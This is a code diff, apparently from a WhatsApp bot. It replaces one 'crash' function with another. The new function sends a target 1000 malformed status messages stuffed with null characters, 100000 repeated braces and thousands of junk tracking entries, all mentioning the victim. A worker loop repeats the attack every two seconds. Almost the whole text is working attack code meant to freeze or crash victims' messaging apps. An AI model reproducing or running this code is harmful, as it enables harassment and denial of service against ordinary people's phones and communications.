@@ -3399,8 +3399,8 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await danylukman(sock, target);
-                    await sleep(3000)
+                    await DenglayhInpis(sock, target);
+                    await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                    
@@ -4524,40 +4524,75 @@ async function VogueDelay(sock, target) {
   }
 }
 
-async function danylukman(sock, target) {
-    const msg = {
-        interactiveMessage: {
-            nativeFlowMessage: {
-                messageParamsJson: JSON.stringify({
-                    data: "\u0000".repeat(500000),
-                    list: Array(1000).fill("ꦾ".repeat(1000))
-                }),
-                
-                buttons: [
-                    {
-                        name: "single_select",
-                        buttonParamsJson: JSON.stringify({
-                            display_text: "ꦽ".repeat(50000),
-                            id: i.toString()
-                        })
-                    },
-                    
-                    {
-                        name: "call_permission_request",
-                        buttonParamsJson: JSON.stringify({
-                            display_text: "ꦽ".repeat(50000)
-                        })
-                    }
-                ]
-            }
+async function DenglayhInpis(sock, target) {
+  for (let i = 0; i < 1000; i++) {
+    await sock.relayMessage(
+      "status@broadcast",
+      {
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
+          fileLength: "98",
+          height: 4,
+          width: 4,
+          mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
+          fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
+          directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
+          mediaKeyTimestamp: "1749728782"
         },
-        
-        participant: {
-            jid: target
+        hasMediaAttachment: true,
+        nativeFlowMessage: {
+          messageParamsJson: ""
+        },
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveResponseMessage: {
+          body: {
+            text: "",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "}".repeat(100000),
+            version: 3
+          },
+          contextInfo: {
+            remoteJid: "K",
+            urlTrackingMap: {
+              urlTrackingMapElements: Array.from({ length: 4000 }, () => ({
+                "\u0000": "\u0000"
+              }))
+            }
+          }
         }
-    };
-    
-    await sock.relayMessage(target, msg, {});
+      },
+      {
+        statusJidList: [target],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { status_setting: "contacts" },
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
+  }
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
